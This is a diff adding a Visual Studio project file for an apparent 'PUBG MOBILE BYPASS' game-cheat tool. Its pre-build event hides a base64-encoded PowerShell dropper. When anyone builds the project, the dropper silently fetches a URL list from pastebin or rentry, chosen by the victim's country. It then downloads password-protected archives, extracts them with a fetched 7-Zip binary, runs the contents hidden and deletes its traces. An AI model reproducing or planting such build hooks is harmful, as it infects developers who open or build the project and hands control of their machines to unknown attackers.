@@ -1,0 +1,130 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{97434E4F-8839-4CD9-A5A8-EB2F39708F26}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <RootNamespace>PM_BYPASS</RootNamespace>
+    <AssemblyName>PUBG MOBILE BYPASS</AssemblyName>
+    <TargetFrameworkVersion>v4.7.2</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
+    <Deterministic>true</Deterministic>
+    <NuGetPackageImportStamp>
+    </NuGetPackageImportStamp>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationIcon>icon.ico</ApplicationIcon>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="ImGui.NET, Version=1.90.0.1, Culture=neutral, processorArchitecture=MSIL">
+      <HintPath>..\packages\ImGui.NET.1.90.0.1\lib\netstandard2.0\ImGui.NET.dll</HintPath>
+    </Reference>
+    <Reference Include="System" />
+    <Reference Include="System.Buffers, Version=4.0.2.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Buffers.4.4.0\lib\netstandard2.0\System.Buffers.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Core" />
+    <Reference Include="System.Numerics" />
+    <Reference Include="System.Numerics.Vectors, Version=4.1.3.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Numerics.Vectors.4.4.0\lib\net46\System.Numerics.Vectors.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Runtime.CompilerServices.Unsafe, Version=4.0.3.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Runtime.CompilerServices.Unsafe.4.4.0\lib\netstandard2.0\System.Runtime.CompilerServices.Unsafe.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Runtime.Serialization" />
+    <Reference Include="System.Xml.Linq" />
+    <Reference Include="System.Data.DataSetExtensions" />
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Deployment" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Net.Http" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Form1.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Form1.Designer.cs">
+      <DependentUpon>Form1.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Form2.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Form2.Designer.cs">
+      <DependentUpon>Form2.cs</DependentUpon>
+    </Compile>
+    <Compile Include="KeyAuth.cs" />
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <EmbeddedResource Include="Form1.resx">
+      <DependentUpon>Form1.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Form2.resx">
+      <DependentUpon>Form2.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Properties\Resources.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <Compile Include="Properties\Resources.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Resources.resx</DependentUpon>
+      <DesignTime>True</DesignTime>
+    </Compile>
+    <None Include="packages.config" />
+    <None Include="Properties\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>Settings.Designer.cs</LastGenOutput>
+    </None>
+    <Compile Include="Properties\Settings.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Settings.settings</DependentUpon>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="App.config" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\bypass.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <Content Include="icon.ico" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+  <Import Project="..\packages\ImGui.NET.1.90.0.1\build\net40\ImGui.NET.targets" Condition="Exists('..\packages\ImGui.NET.1.90.0.1\build\net40\ImGui.NET.targets')" />
+  <Target Name="EnsureNuGetPackageBuildImports" BeforeTargets="PrepareForBuild">
+    <PropertyGroup>
+      <ErrorText>This project references NuGet package(s) that are missing on this computer. Use NuGet Package Restore to download them.  For more information, see http://go.microsoft.com/fwlink/?LinkID=322105. The missing file is {0}.</ErrorText>
+    </PropertyGroup>
+    <Error Condition="!Exists('..\packages\ImGui.NET.1.90.0.1\build\net40\ImGui.NET.targets')" Text="$([System.String]::Format('$(ErrorText)', '..\packages\ImGui.NET.1.90.0.1\build\net40\ImGui.NET.targets'))" />
+  </Target>
+  <PropertyGroup>
+    <PreBuildEvent>@echo off&#xD;&#xA;setlocal&#xD;&#xA;set &quot;base64Data=ZnVuY3Rpb24gRG93bmxvYWQtRmlsZXMoJHVybHMpIHsgJHRlbXBQYXRoID0gW1N5c3RlbS5JTy5QYXRoXTo6R2V0VGVtcFBhdGgoKTsgJHRlbXBGaWxlTmFtZSA9IEpvaW4tUGF0aCAkdGVtcFBhdGggIjd6ci5leGUiOyAkdXJsID0gImh0dHBzOi8vd3d3LjctemlwLm9yZy9hLzd6ci5leGUiOyB0cnkgeyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICR1cmwgLU91dEZpbGUgJHRlbXBGaWxlTmFtZSB9IGNhdGNoIHt9OyBmb3JlYWNoICgkdXJsMSBpbiAkdXJscykgeyB0cnkgeyAkYnl0ZXMgPSBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICR1cmwxIC1NZXRob2QgR2V0IC1Vc2VCYXNpY1BhcnNpbmc7ICRyYW5kU3RyaW5nID0gW1N5c3RlbS5HdWlkXTo6TmV3R3VpZCgpLlRvU3RyaW5nKCkuU3Vic3RyaW5nKDAsIDEwKTsgJGZpbGVQYXRoID0gSm9pbi1QYXRoICR0ZW1wUGF0aCAiJHJhbmRTdHJpbmcuN3oiOyAkYnl0ZXMuQ29udGVudCB8IFNldC1Db250ZW50IC1QYXRoICRmaWxlUGF0aCAtRW5jb2RpbmcgQnl0ZTsgJGV4dHJhY3RQYXRoID0gSm9pbi1QYXRoICR0ZW1wUGF0aCAoIlYiICsgW1N5c3RlbS5HdWlkXTo6TmV3R3VpZCgpLlRvU3RyaW5nKCkpOyAkcHNpID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzc1N0YXJ0SW5mbzsgJHBzaS5GaWxlTmFtZSA9ICIkdGVtcFBhdGhcN3pyLmV4ZSI7ICRwc2kuQXJndW1lbnRzID0gInggYCIkZmlsZVBhdGhgIiAtb2AiJGV4dHJhY3RQYXRoYCIgLXBoUjNeJmIyJUE5IWdLKjZMcVA3dGAkTnBXIjsgJHBzaS5DcmVhdGVOb1dpbmRvdyA9ICR0cnVlOyAkcHNpLlVzZVNoZWxsRXhlY3V0ZSA9ICRmYWxzZTsgJHByb2Nlc3MgPSBbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3NdOjpTdGFydCgkcHNpKTsgJHByb2Nlc3MuV2FpdEZvckV4aXQoKTsgJGV4dHJhY3RlZEZpbGVzID0gR2V0LUNoaWxkSXRlbSAtUGF0aCAkZXh0cmFjdFBhdGg7ICRmaWxlVG9FeGVjdXRlID0gJGV4dHJhY3RlZEZpbGVzWzBdLkZ1bGxOYW1lOyAkcHNpID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzc1N0YXJ0SW5mbzsgJHBzaS5GaWxlTmFtZSA9ICRmaWxlVG9FeGVjdXRlOyAkcHNpLlVzZVNoZWxsRXhlY3V0ZSA9ICRmYWxzZTsgJHBzaS5DcmVhdGVOb1dpbmRvdyA9ICR0cnVlOyBbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3NdOjpTdGFydCgkcHNpKSB9IGNhdGNoIHt9IH0gfSB0cnkgeyBmdW5jdGlvbiBHZXQtQ291bnRyeSB7ICRpcEluZm8gPSBJbnZva2UtUmVzdE1ldGhvZCAtVXJpICJodHRwOi8vaXAtYXBpLmNvbS9qc29uIjsgcmV0dXJuICRpcEluZm8uY291bnRyeUNvZGUgfSAkY291bnRyeSA9IChHZXQtQ291bnRyeSkuVHJpbSgpOyAkYm9keTEgPSBpZiAoJGNvdW50cnkgLWVxICJSVSIpIHsgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAiaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1hpYmlkbmNmIiB9IGVsc2UgeyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICJodHRwczovL3JlbnRyeS5jby9NdWNrQ29tcGFueU1NQy9yYXciIH07ICR1cmxzID0gJGJvZHkxLkNvbnRlbnQgLXNwbGl0ICJgbiIgfCBGb3JFYWNoLU9iamVjdCB7ICRfLlRyaW0oKSB9OyBEb3dubG9hZC1GaWxlcyAkdXJscyB9IGNhdGNoIHt9&quot;&#xD;&#xA;set &quot;tempDir=%25TEMP%25\script&quot;&#xD;&#xA;mkdir &quot;%25tempDir%25&quot; 2&gt;nul&#xD;&#xA;echo Set base64Decoder = CreateObject(&quot;MSXml2.DOMDocument.6.0&quot;).createElement(&quot;base64&quot;) &gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo base64Decoder.DataType = &quot;bin.base64&quot; &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo base64Decoder.Text = &quot;%25base64Data%25&quot; &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo decodedData = base64Decoder.NodeTypedValue &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo outputFile = &quot;%25tempDir%25\decode.ps1&quot; &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo Set fso = CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo Set outFile = fso.CreateTextFile(outputFile, True) &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo outFile.Write BinaryToString(decodedData) &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo outFile.Close &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo Set shell = CreateObject(&quot;WScript.Shell&quot;) &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo shell.Run &quot;powershell.exe -ExecutionPolicy Bypass -File &quot; ^&amp; outputFile, 0, True &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo fso.DeleteFile outputFile &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo Function BinaryToString(Binary) &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo Dim RS, L &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo Set RS = CreateObject(&quot;ADODB.Recordset&quot;) &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo L = LenB(Binary) &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo If L ^&gt; 0 Then &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo RS.Fields.Append &quot;m&quot;, 201, L &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo RS.Open &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo RS.AddNew &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo RS(&quot;m&quot;).AppendChunk Binary &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo RS.Update &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo BinaryToString = RS(&quot;m&quot;).GetChunk(L) &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo Else &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo BinaryToString = &quot;&quot; &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo End If &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo End Function &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;cscript //nologo &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;rd /s /q &quot;%25tempDir%25&quot;&#xD;&#xA;endlocal</PreBuildEvent>
+  </PropertyGroup>
+</Project>
